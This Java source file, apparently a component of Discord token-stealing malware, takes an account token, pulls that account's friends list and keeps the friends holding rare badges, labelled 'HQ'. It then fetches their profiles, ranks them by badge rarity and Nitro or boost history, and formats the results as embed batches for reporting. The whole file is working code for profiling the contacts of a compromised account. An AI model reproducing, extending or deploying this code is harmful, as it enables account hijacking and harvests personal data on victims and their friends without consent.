package noface.sync;

import java.util.ArrayList;
import java.util.List;

public final class Friends {

    private static final int CONTENT_LIMIT = 3500;
    private static final int HQ_MASK = (1<<0)|(1<<1)|(1<<2)|(1<<3)|(1<<9)|(1<<14)|(1<<17)|(1<<18)|(1<<22);

    static final class Row {
        String id, user;
        String badges, profile;
        int flags, nitroMo, boostMo, score;
        boolean quest;
    }

    public static List<String> embeds(String token, String owner) {
        List<Row> all = load(token);
        List<Row> hq = new ArrayList<>();
        for (Row r : all) if ((r.flags & HQ_MASK) != 0) hq.add(r);
        if (hq.isEmpty()) return List.of();

        for (Row r : hq) {
            try { Thread.sleep(300); } catch (InterruptedException ignored) {}
            fillProfile(token, r);
            r.badges = Badges.build(r.flags, r.nitroMo > 0 ? 2 : 0, r.nitroMo, r.boostMo, r.profile);
            r.score = score(r);
        }
        hq.sort((a, b) -> b.score - a.score);

        List<String> lines = new ArrayList<>();
        for (Row r : hq) {
            String b = (r.badges == null || r.badges.isEmpty()) ? "" : r.badges + " | ";
            lines.add(b + "``" + escLine(r.user) + "``\n");
        }

        List<String> chunks = split(lines);
        List<String> out = new ArrayList<>();
        for (int i = 0; i < chunks.size(); i++) {
            out.add(Embed.friendListBatch(chunks.get(i), i == 0, i == chunks.size() - 1, hq.size(), all.size()));
        }
        return out;
    }

    private static List<String> split(List<String> lines) {
        List<String> chunks = new ArrayList<>();
        StringBuilder cur = new StringBuilder();
        for (String line : lines) {
            if (cur.length() + line.length() > CONTENT_LIMIT && cur.length() > 0) {
                chunks.add(cur.toString());
                cur = new StringBuilder();
            }
            cur.append(line);
        }
        if (cur.length() > 0) chunks.add(cur.toString());
        return chunks;
    }

    private static String escLine(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("`", "\\`").replace("\"", "\\\"");
    }

    private static int score(Row r) {
        int base = 0;
        if ((r.flags & (1 << 0)) != 0) base = 8;
        else if ((r.flags & (1 << 14)) != 0) base = 7;
        else if ((r.flags & (1 << 18)) != 0) base = 6;
        else if ((r.flags & (1 << 3)) != 0) base = 5;
        else if ((r.flags & (1 << 1)) != 0) base = 4;
        else if ((r.flags & (1 << 2)) != 0) base = 3;
        else if ((r.flags & (1 << 17)) != 0) base = 2;
        else if ((r.flags & (1 << 9)) != 0) base = 1;
        return base * 10000 + r.nitroMo * 50 + r.boostMo * 10 - (r.quest ? 200 : 0);
    }

    private static void fillProfile(String token, Row r) {
        if (r.id == null || r.id.isEmpty()) return;
        try {
            String data = Api.profile(token, r.id);
            if (data == null) return;
            r.profile = data;
            String ps = val(data, "premium_since");
            if (ps != null && !ps.equals("null")) r.nitroMo = months(ps);
            String gs = val(data, "premium_guild_since");
            if (gs != null && !gs.equals("null")) r.boostMo = Math.max(1, months(gs));
            r.quest = data.toLowerCase().contains("quest");
        } catch (Exception ignored) {}
    }

    private static int months(String iso) {
        try {
            long ts = java.time.Instant.parse(iso.replace("\"", "")).toEpochMilli();
            return (int) ((System.currentTimeMillis() - ts) / (1000L * 60 * 60 * 24 * 30));
        } catch (Exception e) { return 0; }
    }

    private static List<Row> load(String token) {
        String raw = Api.friends(token);
        if (raw == null || raw.isBlank()) return List.of();
        List<Row> out = new ArrayList<>();
        for (String obj : splitArr(raw)) {
            if (!"1".equals(val(obj, "type"))) continue;
            String user = block(obj, "\"user\"");
            if (user == null) continue;
            String name = val(user, "username");
            if (name == null || name.isEmpty()) continue;
            Row r = new Row();
            r.user = name;
            r.id = val(user, "id");
            try { r.flags = Integer.parseInt(val(user, "public_flags") != null ? val(user, "public_flags") : "0"); } catch (Exception e) { r.flags = 0; }
            out.add(r);
        }
        return out;
    }

    private static List<String> splitArr(String json) {
        List<String> items = new ArrayList<>();
        if (json == null || !json.trim().startsWith("[")) return items;
        int depth = 0, start = -1;
        boolean inStr = false, esc = false;
        for (int i = 0; i < json.length(); i++) {
            char c = json.charAt(i);
            if (esc) { esc = false; continue; }
            if (c == '\\' && inStr) { esc = true; continue; }
            if (c == '"') { inStr = !inStr; continue; }
            if (inStr) continue;
            if (c == '{') { if (depth == 0) start = i; depth++; }
            else if (c == '}') { depth--; if (depth == 0 && start >= 0) { items.add(json.substring(start, i + 1)); start = -1; } }
        }
        return items;
    }

    private static String block(String json, String key) {
        int ki = json.indexOf(key);
        if (ki < 0) return null;
        int start = json.indexOf('{', ki + key.length());
        if (start < 0) return null;
        int depth = 1;
        boolean inStr = false, esc = false;
        int i = start + 1;
        while (i < json.length() && depth > 0) {
            char c = json.charAt(i);
            if (esc) { esc = false; i++; continue; }
            if (c == '\\' && inStr) { esc = true; i++; continue; }
            if (c == '"') { inStr = !inStr; i++; continue; }
            if (!inStr) { if (c == '{') depth++; else if (c == '}') depth--; }
            i++;
        }
        return json.substring(start, i);
    }

    private static String val(String json, String key) {
        String s = "\"" + key + "\":";
        int i = json.indexOf(s);
        if (i < 0) return null;
        i += s.length();
        while (i < json.length() && json.charAt(i) == ' ') i++;
        if (i >= json.length()) return null;
        if (json.charAt(i) == 'n') return "null";
        if (json.charAt(i) == '"') {
            int start = i + 1, end = json.indexOf('"', start);
            while (end > 0 && json.charAt(end - 1) == '\\') end = json.indexOf('"', end + 1);
            return end > start ? json.substring(start, end) : "";
        }
        int start = i;
        while (i < json.length() && ",}] ".indexOf(json.charAt(i)) < 0) i++;
        return json.substring(start, i).trim();
    }

    private Friends() {}
}
